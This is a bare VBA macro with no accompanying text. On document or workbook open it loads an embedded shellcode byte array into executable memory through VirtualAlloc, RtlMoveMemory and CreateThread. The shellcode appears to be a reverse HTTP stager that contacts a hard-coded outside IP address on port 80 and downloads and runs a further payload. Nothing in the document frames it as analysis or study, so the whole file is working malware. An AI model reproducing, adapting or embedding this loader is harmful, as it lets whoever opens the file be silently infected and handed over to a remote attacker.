#If Vba7 Then
	Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal Exdpjehfh As Long, ByVal Ewtypuuw As Long, ByVal Luf As LongPtr, Gkg As Long, ByVal Evmzpibp As Long, Hqdw As Long) As LongPtr
	Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal Kzsvrw As Long, ByVal Utlgn As Long, ByVal Xfpkj As Long, ByVal Sdbqdctf As Long) As LongPtr
	Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal Prsy As LongPtr, ByRef Tkcdpje As Any, ByVal Haqgkvfkr As Long) As LongPtr
#Else
	Private Declare Function CreateThread Lib "kernel32" (ByVal Exdpjehfh As Long, ByVal Ewtypuuw As Long, ByVal Luf As Long, Gkg As Long, ByVal Evmzpibp As Long, Hqdw As Long) As Long
	Private Declare Function VirtualAlloc Lib "kernel32" (ByVal Kzsvrw As Long, ByVal Utlgn As Long, ByVal Xfpkj As Long, ByVal Sdbqdctf As Long) As Long
	Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal Prsy As Long, ByRef Tkcdpje As Any, ByVal Haqgkvfkr As Long) As Long
#EndIf

Sub Auto_Open()
	Dim Ijq As Long, Lgqjr As Variant, Piz As Long
#If Vba7 Then
	Dim  Iwggoapil As LongPtr, Xfbnsnj As LongPtr
#Else
	Dim  Iwggoapil As Long, Xfbnsnj As Long
#EndIf
	Lgqjr = Array(232,130,0,0,0,96,137,229,49,192,100,139,80,48,139,82,12,139,82,20,139,114,40,15,183,74,38,49,255,172,60,97,124,2,44,32,193,207,13,1,199,226,242,82,87,139,82,16,139,74,60,139,76,17,120,227,72,1,209,81,139,89,32,1,211,139,73,24,227,58,73,139,52,139,1,214,49,255,172,193, _
207,13,1,199,56,224,117,246,3,125,248,59,125,36,117,228,88,139,88,36,1,211,102,139,12,75,139,88,28,1,211,139,4,139,1,208,137,68,36,36,91,91,97,89,90,81,255,224,95,95,90,139,18,235,141,93,104,110,101,116,0,104,119,105,110,105,84,104,76,119,38,7,255,213,49,219,83,83,83,83, _
83,104,58,86,121,167,255,213,83,83,106,3,83,83,106,80,232,203,0,0,0,47,116,119,73,65,78,73,75,74,109,84,86,79,98,48,57,117,70,52,97,85,104,103,103,74,119,83,45,102,89,55,101,88,99,121,119,78,97,122,107,68,80,52,102,78,102,84,52,113,84,74,69,70,79,121,112,77,120,52, _
102,122,83,79,56,77,50,52,103,84,53,84,117,55,84,119,108,71,83,113,0,80,104,87,137,159,198,255,213,137,198,83,104,0,2,96,132,83,83,83,87,83,86,104,235,85,46,59,255,213,150,106,10,95,83,83,83,83,86,104,45,6,24,123,255,213,133,192,117,20,104,136,19,0,0,104,68,240,53,224, _
255,213,79,117,225,232,75,0,0,0,106,64,104,0,16,0,0,104,0,0,64,0,83,104,88,164,83,229,255,213,147,83,83,137,231,87,104,0,32,0,0,83,86,104,18,150,137,226,255,213,133,192,116,207,139,7,1,195,133,192,117,229,88,195,95,232,127,255,255,255,49,52,54,46,54,52,46,50,49,51, _
46,49,49,53,0,187,240,181,162,86,106,0,83,255,213)

	Iwggoapil = VirtualAlloc(0, UBound(Lgqjr), &H1000, &H40)
	For Piz = LBound(Lgqjr) To UBound(Lgqjr)
		Ijq = Lgqjr(Piz)
		Xfbnsnj = RtlMoveMemory(Iwggoapil + Piz, Ijq, 1)
	Next Piz
	Xfbnsnj = CreateThread(0, 0, Iwggoapil, 0, 0, 0)
End Sub
Sub AutoOpen()
	Auto_Open
End Sub
Sub Workbook_Open()
	Auto_Open
End Sub

